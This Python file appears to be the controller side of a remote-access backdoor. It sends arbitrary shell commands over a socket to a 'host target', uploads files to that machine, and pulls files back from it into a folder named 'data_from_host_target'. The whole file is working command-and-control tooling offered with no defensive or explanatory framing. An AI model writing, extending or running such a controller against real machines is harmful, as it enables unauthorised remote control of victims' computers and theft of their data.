import socket
import os

BUF_SIZE = 4096
FFLAG_START = b"<<FILE_START>>"
FFLAG_END = b"<<FILE_END>>"

def send_cmd(cmd: str, conn: socket.socket):
    
    if cmd.startswith("upfile "):
        filepath = cmd[len("upfile "):]
        
        if not os.path.exists(filepath):
            return f"[ERRCONTR] Missing file"
        
        conn.sendall(cmd.encode())

        status = conn.recv(BUF_SIZE // 4)
        if status == b"rd":
            with open(filepath, "rb") as f:
                conn.sendall(f.read() + FFLAG_END)
            
            return conn.recv(BUF_SIZE // 4).decode()

        else:
            return f"[ERRCONTR] Missing HOST-TARGET"
        
    else:
        conn.sendall(cmd.encode())        
        resp = b""
        
        while True:
            part = conn.recv(BUF_SIZE)
            
            try:
                if FFLAG_START in part:
                    content = part.split(FFLAG_START)[1]
                    if FFLAG_END in content:
                        content = content.split(FFLAG_END)[0]
                        filename = input(">> Save file as: ")
                        dir = "data_from_host_target"
                        fullpath = os.path.join(dir, filename)
                        
                        if not os.path.isdir(dir):
                            os.mkdir(dir)
                        
                        with open(fullpath, "wb") as f:
                            f.write(content)
                        
                        return f"[+] {conn.recv(BUF_SIZE // 4).decode()} | stored in {fullpath}"
                        
                else:
                    resp += part
                    
                    if len(part) < BUF_SIZE:
                        break
                    
            except Exception as e:
                return f"[ERRCONTR] Failed to get data"
            
        return resp.decode()